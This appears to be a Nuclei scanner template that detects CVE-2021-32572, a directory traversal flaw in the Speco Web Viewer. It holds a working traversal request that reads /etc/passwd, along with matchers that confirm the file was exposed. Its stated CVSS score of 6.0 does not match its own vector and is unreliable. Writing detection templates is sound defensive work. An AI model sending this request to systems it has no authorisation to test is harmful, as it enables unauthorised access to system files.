id: speco-web-viewer-directory-traversal
info:
  name: Speco Web Viewer Directory Traversal
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Speco Technologies Speco Web Viewer, a network device, is vulnerable to directory traversal, allowing an attacker to access sensitive server information by crafting specific URI paths.
  classification:
    cve-id: CVE-2021-32572
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.0
  tags: directory-traversal
  reference:
    - https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=5438
    - https://www.specotech.com/

http:
  - raw:
      - |
        GET /../../../../../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*?:0:0:"
      - type: word
        words:
          - "root:x"
        part: body
